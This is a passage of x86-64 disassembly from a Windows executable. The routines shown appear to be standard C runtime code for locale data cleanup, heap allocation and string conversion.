   140007fc0:	48 8b 7c 24 48       	mov    0x48(%rsp),%rdi
   140007fc5:	48 83 c4 20          	add    $0x20,%rsp
   140007fc9:	41 5e                	pop    %r14
   140007fcb:	c3                   	ret
   140007fcc:	40 53                	rex push %rbx
   140007fce:	48 83 ec 20          	sub    $0x20,%rsp
   140007fd2:	b9 07 00 00 00       	mov    $0x7,%ecx
   140007fd7:	e8 0c fa ff ff       	call   0x1400079e8
   140007fdc:	33 db                	xor    %ebx,%ebx
   140007fde:	33 c9                	xor    %ecx,%ecx
   140007fe0:	e8 a7 fb ff ff       	call   0x140007b8c
   140007fe5:	85 c0                	test   %eax,%eax
   140007fe7:	75 0c                	jne    0x140007ff5
   140007fe9:	e8 e6 fd ff ff       	call   0x140007dd4
   140007fee:	e8 d1 fe ff ff       	call   0x140007ec4
   140007ff3:	b3 01                	mov    $0x1,%bl
   140007ff5:	b9 07 00 00 00       	mov    $0x7,%ecx
   140007ffa:	e8 3d fa ff ff       	call   0x140007a3c
   140007fff:	8a c3                	mov    %bl,%al
   140008001:	48 83 c4 20          	add    $0x20,%rsp
   140008005:	5b                   	pop    %rbx
   140008006:	c3                   	ret
   140008007:	cc                   	int3
   140008008:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000800d:	57                   	push   %rdi
   14000800e:	48 83 ec 20          	sub    $0x20,%rsp
   140008012:	33 db                	xor    %ebx,%ebx
   140008014:	48 8d 3d d5 11 01 00 	lea    0x111d5(%rip),%rdi        # 0x1400191f0
   14000801b:	48 8b 0c 3b          	mov    (%rbx,%rdi,1),%rcx
   14000801f:	48 85 c9             	test   %rcx,%rcx
   140008022:	74 0a                	je     0x14000802e
   140008024:	e8 13 fb ff ff       	call   0x140007b3c
   140008029:	48 83 24 3b 00       	andq   $0x0,(%rbx,%rdi,1)
   14000802e:	48 83 c3 08          	add    $0x8,%rbx
   140008032:	48 81 fb 00 04 00 00 	cmp    $0x400,%rbx
   140008039:	72 d9                	jb     0x140008014
   14000803b:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140008040:	b0 01                	mov    $0x1,%al
   140008042:	48 83 c4 20          	add    $0x20,%rsp
   140008046:	5f                   	pop    %rdi
   140008047:	c3                   	ret
   140008048:	48 85 c9             	test   %rcx,%rcx
   14000804b:	0f 84 00 01 00 00    	je     0x140008151
   140008051:	53                   	push   %rbx
   140008052:	48 83 ec 20          	sub    $0x20,%rsp
   140008056:	48 8b d9             	mov    %rcx,%rbx
   140008059:	48 8b 49 18          	mov    0x18(%rcx),%rcx
   14000805d:	48 3b 0d 24 07 01 00 	cmp    0x10724(%rip),%rcx        # 0x140018788
   140008064:	74 05                	je     0x14000806b
   140008066:	e8 c1 e5 ff ff       	call   0x14000662c
   14000806b:	48 8b 4b 20          	mov    0x20(%rbx),%rcx
   14000806f:	48 3b 0d 1a 07 01 00 	cmp    0x1071a(%rip),%rcx        # 0x140018790
   140008076:	74 05                	je     0x14000807d
   140008078:	e8 af e5 ff ff       	call   0x14000662c
   14000807d:	48 8b 4b 28          	mov    0x28(%rbx),%rcx
   140008081:	48 3b 0d 10 07 01 00 	cmp    0x10710(%rip),%rcx        # 0x140018798
   140008088:	74 05                	je     0x14000808f
   14000808a:	e8 9d e5 ff ff       	call   0x14000662c
   14000808f:	48 8b 4b 30          	mov    0x30(%rbx),%rcx
   140008093:	48 3b 0d 06 07 01 00 	cmp    0x10706(%rip),%rcx        # 0x1400187a0
   14000809a:	74 05                	je     0x1400080a1
   14000809c:	e8 8b e5 ff ff       	call   0x14000662c
   1400080a1:	48 8b 4b 38          	mov    0x38(%rbx),%rcx
   1400080a5:	48 3b 0d fc 06 01 00 	cmp    0x106fc(%rip),%rcx        # 0x1400187a8
   1400080ac:	74 05                	je     0x1400080b3
   1400080ae:	e8 79 e5 ff ff       	call   0x14000662c
   1400080b3:	48 8b 4b 40          	mov    0x40(%rbx),%rcx
   1400080b7:	48 3b 0d f2 06 01 00 	cmp    0x106f2(%rip),%rcx        # 0x1400187b0
   1400080be:	74 05                	je     0x1400080c5
   1400080c0:	e8 67 e5 ff ff       	call   0x14000662c
   1400080c5:	48 8b 4b 48          	mov    0x48(%rbx),%rcx
   1400080c9:	48 3b 0d e8 06 01 00 	cmp    0x106e8(%rip),%rcx        # 0x1400187b8
   1400080d0:	74 05                	je     0x1400080d7
   1400080d2:	e8 55 e5 ff ff       	call   0x14000662c
   1400080d7:	48 8b 4b 68          	mov    0x68(%rbx),%rcx
   1400080db:	48 3b 0d f6 06 01 00 	cmp    0x106f6(%rip),%rcx        # 0x1400187d8
   1400080e2:	74 05                	je     0x1400080e9
   1400080e4:	e8 43 e5 ff ff       	call   0x14000662c
   1400080e9:	48 8b 4b 70          	mov    0x70(%rbx),%rcx
   1400080ed:	48 3b 0d ec 06 01 00 	cmp    0x106ec(%rip),%rcx        # 0x1400187e0
   1400080f4:	74 05                	je     0x1400080fb
   1400080f6:	e8 31 e5 ff ff       	call   0x14000662c
   1400080fb:	48 8b 4b 78          	mov    0x78(%rbx),%rcx
   1400080ff:	48 3b 0d e2 06 01 00 	cmp    0x106e2(%rip),%rcx        # 0x1400187e8
   140008106:	74 05                	je     0x14000810d
   140008108:	e8 1f e5 ff ff       	call   0x14000662c
   14000810d:	48 8b 8b 80 00 00 00 	mov    0x80(%rbx),%rcx
   140008114:	48 3b 0d d5 06 01 00 	cmp    0x106d5(%rip),%rcx        # 0x1400187f0
   14000811b:	74 05                	je     0x140008122
   14000811d:	e8 0a e5 ff ff       	call   0x14000662c
   140008122:	48 8b 8b 88 00 00 00 	mov    0x88(%rbx),%rcx
   140008129:	48 3b 0d c8 06 01 00 	cmp    0x106c8(%rip),%rcx        # 0x1400187f8
   140008130:	74 05                	je     0x140008137
   140008132:	e8 f5 e4 ff ff       	call   0x14000662c
   140008137:	48 8b 8b 90 00 00 00 	mov    0x90(%rbx),%rcx
   14000813e:	48 3b 0d bb 06 01 00 	cmp    0x106bb(%rip),%rcx        # 0x140018800
   140008145:	74 05                	je     0x14000814c
   140008147:	e8 e0 e4 ff ff       	call   0x14000662c
   14000814c:	48 83 c4 20          	add    $0x20,%rsp
   140008150:	5b                   	pop    %rbx
   140008151:	c3                   	ret
   140008152:	cc                   	int3
   140008153:	cc                   	int3
   140008154:	48 85 c9             	test   %rcx,%rcx
   140008157:	74 66                	je     0x1400081bf
   140008159:	53                   	push   %rbx
   14000815a:	48 83 ec 20          	sub    $0x20,%rsp
   14000815e:	48 8b d9             	mov    %rcx,%rbx
   140008161:	48 8b 09             	mov    (%rcx),%rcx
   140008164:	48 3b 0d 05 06 01 00 	cmp    0x10605(%rip),%rcx        # 0x140018770
   14000816b:	74 05                	je     0x140008172
   14000816d:	e8 ba e4 ff ff       	call   0x14000662c
   140008172:	48 8b 4b 08          	mov    0x8(%rbx),%rcx
   140008176:	48 3b 0d fb 05 01 00 	cmp    0x105fb(%rip),%rcx        # 0x140018778
   14000817d:	74 05                	je     0x140008184
   14000817f:	e8 a8 e4 ff ff       	call   0x14000662c
   140008184:	48 8b 4b 10          	mov    0x10(%rbx),%rcx
   140008188:	48 3b 0d f1 05 01 00 	cmp    0x105f1(%rip),%rcx        # 0x140018780
   14000818f:	74 05                	je     0x140008196
   140008191:	e8 96 e4 ff ff       	call   0x14000662c
   140008196:	48 8b 4b 58          	mov    0x58(%rbx),%rcx
   14000819a:	48 3b 0d 27 06 01 00 	cmp    0x10627(%rip),%rcx        # 0x1400187c8
   1400081a1:	74 05                	je     0x1400081a8
   1400081a3:	e8 84 e4 ff ff       	call   0x14000662c
   1400081a8:	48 8b 4b 60          	mov    0x60(%rbx),%rcx
   1400081ac:	48 3b 0d 1d 06 01 00 	cmp    0x1061d(%rip),%rcx        # 0x1400187d0
   1400081b3:	74 05                	je     0x1400081ba
   1400081b5:	e8 72 e4 ff ff       	call   0x14000662c
   1400081ba:	48 83 c4 20          	add    $0x20,%rsp
   1400081be:	5b                   	pop    %rbx
   1400081bf:	c3                   	ret
   1400081c0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400081c5:	57                   	push   %rdi
   1400081c6:	48 83 ec 20          	sub    $0x20,%rsp
   1400081ca:	48 8d 3c d1          	lea    (%rcx,%rdx,8),%rdi
   1400081ce:	48 8b d9             	mov    %rcx,%rbx
   1400081d1:	48 3b cf             	cmp    %rdi,%rcx
   1400081d4:	74 11                	je     0x1400081e7
   1400081d6:	48 8b 0b             	mov    (%rbx),%rcx
   1400081d9:	e8 4e e4 ff ff       	call   0x14000662c
   1400081de:	48 83 c3 08          	add    $0x8,%rbx
   1400081e2:	48 3b df             	cmp    %rdi,%rbx
   1400081e5:	75 ef                	jne    0x1400081d6
   1400081e7:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400081ec:	48 83 c4 20          	add    $0x20,%rsp
   1400081f0:	5f                   	pop    %rdi
   1400081f1:	c3                   	ret
   1400081f2:	cc                   	int3
   1400081f3:	cc                   	int3
   1400081f4:	48 85 c9             	test   %rcx,%rcx
   1400081f7:	0f 84 fe 00 00 00    	je     0x1400082fb
   1400081fd:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140008202:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   140008207:	56                   	push   %rsi
   140008208:	48 83 ec 20          	sub    $0x20,%rsp
   14000820c:	bd 07 00 00 00       	mov    $0x7,%ebp
   140008211:	48 8b d9             	mov    %rcx,%rbx
   140008214:	8b d5                	mov    %ebp,%edx
   140008216:	e8 a5 ff ff ff       	call   0x1400081c0
   14000821b:	48 8d 4b 38          	lea    0x38(%rbx),%rcx
   14000821f:	8b d5                	mov    %ebp,%edx
   140008221:	e8 9a ff ff ff       	call   0x1400081c0
   140008226:	8d 75 05             	lea    0x5(%rbp),%esi
   140008229:	8b d6                	mov    %esi,%edx
   14000822b:	48 8d 4b 70          	lea    0x70(%rbx),%rcx
   14000822f:	e8 8c ff ff ff       	call   0x1400081c0
   140008234:	48 8d 8b d0 00 00 00 	lea    0xd0(%rbx),%rcx
   14000823b:	8b d6                	mov    %esi,%edx
   14000823d:	e8 7e ff ff ff       	call   0x1400081c0
   140008242:	48 8d 8b 30 01 00 00 	lea    0x130(%rbx),%rcx
   140008249:	8d 55 fb             	lea    -0x5(%rbp),%edx
   14000824c:	e8 6f ff ff ff       	call   0x1400081c0
   140008251:	48 8b 8b 40 01 00 00 	mov    0x140(%rbx),%rcx
   140008258:	e8 cf e3 ff ff       	call   0x14000662c
   14000825d:	48 8b 8b 48 01 00 00 	mov    0x148(%rbx),%rcx
   140008264:	e8 c3 e3 ff ff       	call   0x14000662c
   140008269:	48 8b 8b 50 01 00 00 	mov    0x150(%rbx),%rcx
   140008270:	e8 b7 e3 ff ff       	call   0x14000662c
   140008275:	48 8d 8b 60 01 00 00 	lea    0x160(%rbx),%rcx
   14000827c:	8b d5                	mov    %ebp,%edx
   14000827e:	e8 3d ff ff ff       	call   0x1400081c0
   140008283:	48 8d 8b 98 01 00 00 	lea    0x198(%rbx),%rcx
   14000828a:	8b d5                	mov    %ebp,%edx
   14000828c:	e8 2f ff ff ff       	call   0x1400081c0
   140008291:	48 8d 8b d0 01 00 00 	lea    0x1d0(%rbx),%rcx
   140008298:	8b d6                	mov    %esi,%edx
   14000829a:	e8 21 ff ff ff       	call   0x1400081c0
   14000829f:	48 8d 8b 30 02 00 00 	lea    0x230(%rbx),%rcx
   1400082a6:	8b d6                	mov    %esi,%edx
   1400082a8:	e8 13 ff ff ff       	call   0x1400081c0
   1400082ad:	48 8d 8b 90 02 00 00 	lea    0x290(%rbx),%rcx
   1400082b4:	8d 55 fb             	lea    -0x5(%rbp),%edx
   1400082b7:	e8 04 ff ff ff       	call   0x1400081c0
   1400082bc:	48 8b 8b a0 02 00 00 	mov    0x2a0(%rbx),%rcx
   1400082c3:	e8 64 e3 ff ff       	call   0x14000662c
   1400082c8:	48 8b 8b a8 02 00 00 	mov    0x2a8(%rbx),%rcx
   1400082cf:	e8 58 e3 ff ff       	call   0x14000662c
   1400082d4:	48 8b 8b b0 02 00 00 	mov    0x2b0(%rbx),%rcx
   1400082db:	e8 4c e3 ff ff       	call   0x14000662c
   1400082e0:	48 8b 8b b8 02 00 00 	mov    0x2b8(%rbx),%rcx
   1400082e7:	e8 40 e3 ff ff       	call   0x14000662c
   1400082ec:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400082f1:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   1400082f6:	48 83 c4 20          	add    $0x20,%rsp
   1400082fa:	5e                   	pop    %rsi
   1400082fb:	c3                   	ret
   1400082fc:	40 53                	rex push %rbx
   1400082fe:	48 83 ec 20          	sub    $0x20,%rsp
   140008302:	48 8b d9             	mov    %rcx,%rbx
   140008305:	48 83 f9 e0          	cmp    $0xffffffffffffffe0,%rcx
   140008309:	77 3c                	ja     0x140008347
   14000830b:	48 85 c9             	test   %rcx,%rcx
   14000830e:	b8 01 00 00 00       	mov    $0x1,%eax
   140008313:	48 0f 44 d8          	cmove  %rax,%rbx
   140008317:	eb 15                	jmp    0x14000832e
   140008319:	e8 42 cd ff ff       	call   0x140005060
   14000831e:	85 c0                	test   %eax,%eax
   140008320:	74 25                	je     0x140008347
   140008322:	48 8b cb             	mov    %rbx,%rcx
   140008325:	e8 1e 0c 00 00       	call   0x140008f48
   14000832a:	85 c0                	test   %eax,%eax
   14000832c:	74 19                	je     0x140008347
   14000832e:	48 8b 0d 63 14 01 00 	mov    0x11463(%rip),%rcx        # 0x140019798
   140008335:	4c 8b c3             	mov    %rbx,%r8
   140008338:	33 d2                	xor    %edx,%edx
   14000833a:	ff 15 c0 5c 00 00    	call   *0x5cc0(%rip)        # 0x14000e000
   140008340:	48 85 c0             	test   %rax,%rax
   140008343:	74 d4                	je     0x140008319
   140008345:	eb 0d                	jmp    0x140008354
   140008347:	e8 48 e2 ff ff       	call   0x140006594
   14000834c:	c7 00 0c 00 00 00    	movl   $0xc,(%rax)
   140008352:	33 c0                	xor    %eax,%eax
   140008354:	48 83 c4 20          	add    $0x20,%rsp
   140008358:	5b                   	pop    %rbx
   140008359:	c3                   	ret
   14000835a:	cc                   	int3
   14000835b:	cc                   	int3
   14000835c:	45 33 c9             	xor    %r9d,%r9d
   14000835f:	66 44 39 09          	cmp    %r9w,(%rcx)
   140008363:	74 28                	je     0x14000838d
   140008365:	4c 8b c2             	mov    %rdx,%r8
   140008368:	66 44 39 0a          	cmp    %r9w,(%rdx)
   14000836c:	74 15                	je     0x140008383
   14000836e:	0f b7 02             	movzwl (%rdx),%eax
   140008371:	66 3b 01             	cmp    (%rcx),%ax
   140008374:	74 13                	je     0x140008389
   140008376:	49 83 c0 02          	add    $0x2,%r8
   14000837a:	41 0f b7 00          	movzwl (%r8),%eax
   14000837e:	66 85 c0             	test   %ax,%ax
   140008381:	75 ee                	jne    0x140008371
   140008383:	48 83 c1 02          	add    $0x2,%rcx
   140008387:	eb d6                	jmp    0x14000835f
   140008389:	48 8b c1             	mov    %rcx,%rax
   14000838c:	c3                   	ret
   14000838d:	33 c0                	xor    %eax,%eax
   14000838f:	c3                   	ret
   140008390:	40 55                	rex push %rbp
   140008392:	41 54                	push   %r12
   140008394:	41 55                	push   %r13
   140008396:	41 56                	push   %r14
   140008398:	41 57                	push   %r15
   14000839a:	48 83 ec 60          	sub    $0x60,%rsp
   14000839e:	48 8d 6c 24 30       	lea    0x30(%rsp),%rbp
   1400083a3:	48 89 5d 60          	mov    %rbx,0x60(%rbp)
   1400083a7:	48 89 75 68          	mov    %rsi,0x68(%rbp)
   1400083ab:	48 89 7d 70          	mov    %rdi,0x70(%rbp)
   1400083af:	48 8b 05 8a fc 00 00 	mov    0xfc8a(%rip),%rax        # 0x140018040
   1400083b6:	48 33 c5             	xor    %rbp,%rax
   1400083b9:	48 89 45 20          	mov    %rax,0x20(%rbp)
   1400083bd:	44 8b ea             	mov    %edx,%r13d
   1400083c0:	45 8b f9             	mov    %r9d,%r15d
   1400083c3:	48 8b d1             	mov    %rcx,%rdx
   1400083c6:	4d 8b e0             	mov    %r8,%r12
   1400083c9:	48 8d 4d 00          	lea    0x0(%rbp),%rcx
   1400083cd:	e8 26 e8 ff ff       	call   0x140006bf8
   1400083d2:	8b bd 88 00 00 00    	mov    0x88(%rbp),%edi
   1400083d8:	85 ff                	test   %edi,%edi
   1400083da:	75 07                	jne    0x1400083e3
   1400083dc:	48 8b 45 08          	mov    0x8(%rbp),%rax
   1400083e0:	8b 78 0c             	mov    0xc(%rax),%edi
   1400083e3:	f7 9d 90 00 00 00    	negl   0x90(%rbp)
   1400083e9:	45 8b cf             	mov    %r15d,%r9d
   1400083ec:	4d 8b c4             	mov    %r12,%r8
   1400083ef:	8b cf                	mov    %edi,%ecx
   1400083f1:	1b d2                	sbb    %edx,%edx
   1400083f3:	83 64 24 28 00       	andl   $0x0,0x28(%rsp)
   1400083f8:	48 83 64 24 20 00    	andq   $0x0,0x20(%rsp)
   1400083fe:	83 e2 08             	and    $0x8,%edx
   140008401:	ff c2                	inc    %edx
   140008403:	e8 f0 f3 ff ff       	call   0x1400077f8
   140008408:	4c 63 f0             	movslq %eax,%r14
   14000840b:	85 c0                	test   %eax,%eax
   14000840d:	75 07                	jne    0x140008416
   14000840f:	33 ff                	xor    %edi,%edi
   140008411:	e9 da 00 00 00       	jmp    0x1400084f0
   140008416:	49 8b f6             	mov    %r14,%rsi
   140008419:	48 03 f6             	add    %rsi,%rsi
   14000841c:	48 8d 46 10          	lea    0x10(%rsi),%rax
   140008420:	48 3b f0             	cmp    %rax,%rsi
   140008423:	48 1b c9             	sbb    %rcx,%rcx
   140008426:	48 23 c8             	and    %rax,%rcx
   140008429:	0f 84 a7 00 00 00    	je     0x1400084d6
   14000842f:	48 81 f9 00 04 00 00 	cmp    $0x400,%rcx
   140008436:	77 31                	ja     0x140008469
   140008438:	48 8d 41 0f          	lea    0xf(%rcx),%rax
   14000843c:	48 3b c1             	cmp    %rcx,%rax
   14000843f:	77 0a                	ja     0x14000844b
   140008441:	48 b8 f0 ff ff ff ff 	movabs $0xffffffffffffff0,%rax
   140008448:	ff ff 0f 
   14000844b:	48 83 e0 f0          	and    $0xfffffffffffffff0,%rax
   14000844f:	e8 3c 49 00 00       	call   0x14000cd90
   140008454:	48 2b e0             	sub    %rax,%rsp
   140008457:	48 8d 5c 24 30       	lea    0x30(%rsp),%rbx
   14000845c:	48 85 db             	test   %rbx,%rbx
   14000845f:	74 1f                	je     0x140008480
   140008461:	c7 03 cc cc 00 00    	movl   $0xcccc,(%rbx)
   140008467:	eb 13                	jmp    0x14000847c
   140008469:	e8 8e fe ff ff       	call   0x1400082fc
   14000846e:	48 8b d8             	mov    %rax,%rbx
   140008471:	48 85 c0             	test   %rax,%rax
   140008474:	74 0a                	je     0x140008480
   140008476:	c7 00 dd dd 00 00    	movl   $0xdddd,(%rax)
   14000847c:	48 83 c3 10          	add    $0x10,%rbx
   140008480:	48 8b c3             	mov    %rbx,%rax
   140008483:	48 85 db             	test   %rbx,%rbx
   140008486:	74 50                	je     0x1400084d8
   140008488:	4c 8b c6             	mov    %rsi,%r8
   14000848b:	33 d2                	xor    %edx,%edx
   14000848d:	48 8b cb             	mov    %rbx,%rcx
   140008490:	e8 9b 4a 00 00       	call   0x14000cf30
   140008495:	45 8b cf             	mov    %r15d,%r9d
   140008498:	44 89 74 24 28       	mov    %r14d,0x28(%rsp)
   14000849d:	4d 8b c4             	mov    %r12,%r8
   1400084a0:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   1400084a5:	ba 01 00 00 00       	mov    $0x1,%edx
   1400084aa:	8b cf                	mov    %edi,%ecx
   1400084ac:	e8 47 f3 ff ff       	call   0x1400077f8
   1400084b1:	44 8b c0             	mov    %eax,%r8d
   1400084b4:	48 8b c3             	mov    %rbx,%rax
   1400084b7:	45 85 c0             	test   %r8d,%r8d
   1400084ba:	74 1c                	je     0x1400084d8
   1400084bc:	4c 8b 8d 80 00 00 00 	mov    0x80(%rbp),%r9
   1400084c3:	48 8b d3             	mov    %rbx,%rdx
   1400084c6:	41 8b cd             	mov    %r13d,%ecx
   1400084c9:	ff 15 f9 5c 00 00    	call   *0x5cf9(%rip)        # 0x14000e1c8
   1400084cf:	8b f8                	mov    %eax,%edi
   1400084d1:	48 8b c3             	mov    %rbx,%rax
   1400084d4:	eb 09                	jmp    0x1400084df
   1400084d6:	33 c0                	xor    %eax,%eax
   1400084d8:	33 ff                	xor    %edi,%edi
   1400084da:	48 85 c0             	test   %rax,%rax
   1400084dd:	74 11                	je     0x1400084f0
   1400084df:	48 8d 48 f0          	lea    -0x10(%rax),%rcx
   1400084e3:	81 39 dd dd 00 00    	cmpl   $0xdddd,(%rcx)
   1400084e9:	75 05                	jne    0x1400084f0
   1400084eb:	e8 3c e1 ff ff       	call   0x14000662c
   1400084f0:	80 7d 18 00          	cmpb   $0x0,0x18(%rbp)
   1400084f4:	74 0b                	je     0x140008501
   1400084f6:	48 8b 45 00          	mov    0x0(%rbp),%rax
   1400084fa:	83 a0 a8 03 00 00 fd 	andl   $0xfffffffd,0x3a8(%rax)
   140008501:	8b c7                	mov    %edi,%eax
   140008503:	48 8b 4d 20          	mov    0x20(%rbp),%rcx
   140008507:	48 33 cd             	xor    %rbp,%rcx
   14000850a:	e8 c1 46 00 00       	call   0x14000cbd0
   14000850f:	48 8b 5d 60          	mov    0x60(%rbp),%rbx
   140008513:	48 8b 75 68          	mov    0x68(%rbp),%rsi
   140008517:	48 8b 7d 70          	mov    0x70(%rbp),%rdi
   14000851b:	48 8d 65 30          	lea    0x30(%rbp),%rsp
   14000851f:	41 5f                	pop    %r15
   140008521:	41 5e                	pop    %r14
   140008523:	41 5d                	pop    %r13
   140008525:	41 5c                	pop    %r12
   140008527:	5d                   	pop    %rbp
   140008528:	c3                   	ret
   140008529:	cc                   	int3
   14000852a:	cc                   	int3
   14000852b:	cc                   	int3
   14000852c:	f0 ff 41 10          	lock incl 0x10(%rcx)
   140008530:	48 8b 81 e0 00 00 00 	mov    0xe0(%rcx),%rax
   140008537:	48 85 c0             	test   %rax,%rax
   14000853a:	74 03                	je     0x14000853f
   14000853c:	f0 ff 00             	lock incl (%rax)
   14000853f:	48 8b 81 f0 00 00 00 	mov    0xf0(%rcx),%rax
   140008546:	48 85 c0             	test   %rax,%rax
   140008549:	74 03                	je     0x14000854e
   14000854b:	f0 ff 00             	lock incl (%rax)
   14000854e:	48 8b 81 e8 00 00 00 	mov    0xe8(%rcx),%rax
   140008555:	48 85 c0             	test   %rax,%rax
   140008558:	74 03                	je     0x14000855d
   14000855a:	f0 ff 00             	lock incl (%rax)
   14000855d:	48 8b 81 00 01 00 00 	mov    0x100(%rcx),%rax
   140008564:	48 85 c0             	test   %rax,%rax
   140008567:	74 03                	je     0x14000856c
   140008569:	f0 ff 00             	lock incl (%rax)
   14000856c:	48 8d 41 38          	lea    0x38(%rcx),%rax
   140008570:	41 b8 06 00 00 00    	mov    $0x6,%r8d
   140008576:	48 8d 15 eb 01 01 00 	lea    0x101eb(%rip),%rdx        # 0x140018768
   14000857d:	48 39 50 f0          	cmp    %rdx,-0x10(%rax)
   140008581:	74 0b                	je     0x14000858e
   140008583:	48 8b 10             	mov    (%rax),%rdx
   140008586:	48 85 d2             	test   %rdx,%rdx
   140008589:	74 03                	je     0x14000858e
   14000858b:	f0 ff 02             	lock incl (%rdx)
   14000858e:	48 83 78 e8 00       	cmpq   $0x0,-0x18(%rax)
   140008593:	74 0c                	je     0x1400085a1
   140008595:	48 8b 50 f8          	mov    -0x8(%rax),%rdx
   140008599:	48 85 d2             	test   %rdx,%rdx
   14000859c:	74 03                	je     0x1400085a1
   14000859e:	f0 ff 02             	lock incl (%rdx)
   1400085a1:	48 83 c0 20          	add    $0x20,%rax
   1400085a5:	49 83 e8 01          	sub    $0x1,%r8
   1400085a9:	75 cb                	jne    0x140008576
   1400085ab:	48 8b 89 20 01 00 00 	mov    0x120(%rcx),%rcx
   1400085b2:	e9 79 01 00 00       	jmp    0x140008730
   1400085b7:	cc                   	int3
   1400085b8:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400085bd:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   1400085c2:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   1400085c7:	57                   	push   %rdi
   1400085c8:	48 83 ec 20          	sub    $0x20,%rsp
   1400085cc:	48 8b 81 f8 00 00 00 	mov    0xf8(%rcx),%rax
   1400085d3:	48 8b d9             	mov    %rcx,%rbx
   1400085d6:	48 85 c0             	test   %rax,%rax
   1400085d9:	74 79                	je     0x140008654
   1400085db:	48 8d 0d 8e 01 01 00 	lea    0x1018e(%rip),%rcx        # 0x140018770
   1400085e2:	48 3b c1             	cmp    %rcx,%rax
   1400085e5:	74 6d                	je     0x140008654
   1400085e7:	48 8b 83 e0 00 00 00 	mov    0xe0(%rbx),%rax
   1400085ee:	48 85 c0             	test   %rax,%rax
   1400085f1:	74 61                	je     0x140008654
   1400085f3:	83 38 00             	cmpl   $0x0,(%rax)
   1400085f6:	75 5c                	jne    0x140008654
   1400085f8:	48 8b 8b f0 00 00 00 	mov    0xf0(%rbx),%rcx
   1400085ff:	48 85 c9             	test   %rcx,%rcx
   140008602:	74 16                	je     0x14000861a
   140008604:	83 39 00             	cmpl   $0x0,(%rcx)
   140008607:	75 11                	jne    0x14000861a
   140008609:	e8 1e e0 ff ff       	call   0x14000662c
   14000860e:	48 8b 8b f8 00 00 00 	mov    0xf8(%rbx),%rcx
   140008615:	e8 2e fa ff ff       	call   0x140008048
   14000861a:	48 8b 8b e8 00 00 00 	mov    0xe8(%rbx),%rcx
   140008621:	48 85 c9             	test   %rcx,%rcx
   140008624:	74 16                	je     0x14000863c
   140008626:	83 39 00             	cmpl   $0x0,(%rcx)
   140008629:	75 11                	jne    0x14000863c
   14000862b:	e8 fc df ff ff       	call   0x14000662c
   140008630:	48 8b 8b f8 00 00 00 	mov    0xf8(%rbx),%rcx
   140008637:	e8 18 fb ff ff       	call   0x140008154
   14000863c:	48 8b 8b e0 00 00 00 	mov    0xe0(%rbx),%rcx
   140008643:	e8 e4 df ff ff       	call   0x14000662c
   140008648:	48 8b 8b f8 00 00 00 	mov    0xf8(%rbx),%rcx
   14000864f:	e8 d8 df ff ff       	call   0x14000662c
   140008654:	48 8b 83 00 01 00 00 	mov    0x100(%rbx),%rax
   14000865b:	48 85 c0             	test   %rax,%rax
   14000865e:	74 47                	je     0x1400086a7
   140008660:	83 38 00             	cmpl   $0x0,(%rax)
   140008663:	75 42                	jne    0x1400086a7
   140008665:	48 8b 8b 08 01 00 00 	mov    0x108(%rbx),%rcx
   14000866c:	48 81 e9 fe 00 00 00 	sub    $0xfe,%rcx
   140008673:	e8 b4 df ff ff       	call   0x14000662c
   140008678:	48 8b 8b 10 01 00 00 	mov    0x110(%rbx),%rcx
   14000867f:	bf 80 00 00 00       	mov    $0x80,%edi
   140008684:	48 2b cf             	sub    %rdi,%rcx
   140008687:	e8 a0 df ff ff       	call   0x14000662c
   14000868c:	48 8b 8b 18 01 00 00 	mov    0x118(%rbx),%rcx
   140008693:	48 2b cf             	sub    %rdi,%rcx
   140008696:	e8 91 df ff ff       	call   0x14000662c
   14000869b:	48 8b 8b 00 01 00 00 	mov    0x100(%rbx),%rcx
   1400086a2:	e8 85 df ff ff       	call   0x14000662c
   1400086a7:	48 8b 8b 20 01 00 00 	mov    0x120(%rbx),%rcx
   1400086ae:	e8 a5 00 00 00       	call   0x140008758
   1400086b3:	48 8d b3 28 01 00 00 	lea    0x128(%rbx),%rsi
   1400086ba:	bd 06 00 00 00       	mov    $0x6,%ebp
   1400086bf:	48 8d 7b 38          	lea    0x38(%rbx),%rdi
   1400086c3:	48 8d 05 9e 00 01 00 	lea    0x1009e(%rip),%rax        # 0x140018768
   1400086ca:	48 39 47 f0          	cmp    %rax,-0x10(%rdi)
   1400086ce:	74 1a                	je     0x1400086ea
   1400086d0:	48 8b 0f             	mov    (%rdi),%rcx
   1400086d3:	48 85 c9             	test   %rcx,%rcx
   1400086d6:	74 12                	je     0x1400086ea
   1400086d8:	83 39 00             	cmpl   $0x0,(%rcx)
   1400086db:	75 0d                	jne    0x1400086ea
   1400086dd:	e8 4a df ff ff       	call   0x14000662c
   1400086e2:	48 8b 0e             	mov    (%rsi),%rcx
   1400086e5:	e8 42 df ff ff       	call   0x14000662c
   1400086ea:	48 83 7f e8 00       	cmpq   $0x0,-0x18(%rdi)
   1400086ef:	74 13                	je     0x140008704
   1400086f1:	48 8b 4f f8          	mov    -0x8(%rdi),%rcx
   1400086f5:	48 85 c9             	test   %rcx,%rcx
   1400086f8:	74 0a                	je     0x140008704
   1400086fa:	83 39 00             	cmpl   $0x0,(%rcx)
   1400086fd:	75 05                	jne    0x140008704
   1400086ff:	e8 28 df ff ff       	call   0x14000662c
   140008704:	48 83 c6 08          	add    $0x8,%rsi
   140008708:	48 83 c7 20          	add    $0x20,%rdi
   14000870c:	48 83 ed 01          	sub    $0x1,%rbp
   140008710:	75 b1                	jne    0x1400086c3
   140008712:	48 8b cb             	mov    %rbx,%rcx
   140008715:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000871a:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   14000871f:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   140008724:	48 83 c4 20          	add    $0x20,%rsp
   140008728:	5f                   	pop    %rdi
   140008729:	e9 fe de ff ff       	jmp    0x14000662c
   14000872e:	cc                   	int3
   14000872f:	cc                   	int3
   140008730:	48 85 c9             	test   %rcx,%rcx
   140008733:	74 1c                	je     0x140008751
